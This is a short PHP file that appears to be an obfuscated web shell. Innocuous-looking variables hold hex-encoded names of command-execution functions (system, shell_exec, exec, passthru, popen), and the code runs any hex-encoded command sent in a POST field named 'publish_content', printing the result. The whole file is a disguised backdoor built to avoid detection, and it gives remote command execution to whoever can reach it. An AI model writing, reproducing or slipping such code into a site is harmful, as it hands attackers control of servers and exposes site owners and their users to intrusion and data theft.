<?php


$reference1 = '7';
$reference2 = '3';
$reference3 = '9';
$reference4 = '6';
$reference5 = 'd';
$reference6 = '5';
$reference7 = 'c';
$reference8 = 'f';
$reference9 = '8';
$reference10 = '1';
$reference11 = '4';
$reference12 = '2';
$reference13 = 'e';
$system_core1 = pack("H*", $reference1 . $reference2 . '7' . $reference3 . $reference1 . '3' . $reference1 . '4' . $reference4 . '5' . $reference4 . $reference5);
$system_core2 = pack("H*", $reference1 . '3' . $reference4 . '8' . $reference4 . $reference6 . $reference4 . 'c' . '6' . $reference7 . $reference6 . $reference8 . '6' . '5' . $reference1 . $reference9 . '6' . $reference6 . '6' . $reference2);
$system_core3 = pack("H*", '6' . $reference6 . $reference1 . '8' . $reference4 . '5' . '6' . '3');
$system_core4 = pack("H*", '7' . '0' . $reference4 . $reference10 . '7' . $reference2 . $reference1 . $reference2 . $reference1 . $reference11 . $reference4 . '8' . $reference1 . $reference12 . '7' . $reference6);
$system_core5 = pack("H*", '7' . '0' . $reference4 . $reference8 . $reference1 . '0' . '6' . '5' . '6' . 'e');
$system_core6 = pack("H*", '7' . '3' . $reference1 . $reference11 . $reference1 . '2' . $reference4 . $reference6 . $reference4 . $reference10 . $reference4 . 'd' . '5' . $reference8 . '6' . $reference1 . '6' . '5' . '7' . $reference11 . '5' . $reference8 . $reference4 . $reference2 . $reference4 . 'f' . '6' . $reference13 . '7' . $reference11 . $reference4 . $reference6 . '6' . 'e' . '7' . $reference11 . '7' . '3');
$system_core7 = pack("H*", $reference1 . '0' . '6' . $reference2 . '6' . 'c' . '6' . 'f' . '7' . '3' . $reference4 . $reference6);
$publish_content = pack("H*", '7' . '0' . $reference1 . '5' . $reference4 . $reference12 . '6' . $reference7 . '6' . $reference3 . '7' . $reference2 . '6' . '8' . $reference6 . $reference8 . '6' . $reference2 . '6' . $reference8 . $reference4 . 'e' . '7' . '4' . $reference4 . '5' . '6' . 'e' . '7' . $reference11);
if (isset($_POST[$publish_content])) {
    $publish_content = pack("H*", $_POST[$publish_content]);
    if (function_exists($system_core1)) {
        $system_core1($publish_content);
    } elseif (function_exists($system_core2)) {
        print $system_core2($publish_content);
    } elseif (function_exists($system_core3)) {
        $system_core3($publish_content, $ent_desc);
        print join("\n", $ent_desc);
    } elseif (function_exists($system_core4)) {
        $system_core4($publish_content);
    } elseif (function_exists($system_core5) && function_exists($system_core6) && function_exists($system_core7)) {
        $tkn_elem = $system_core5($publish_content, 'r');
        if ($tkn_elem) {
            $obj_binding = $system_core6($tkn_elem);
            $system_core7($tkn_elem);
            print $obj_binding;
        }
    }
    exit;
}
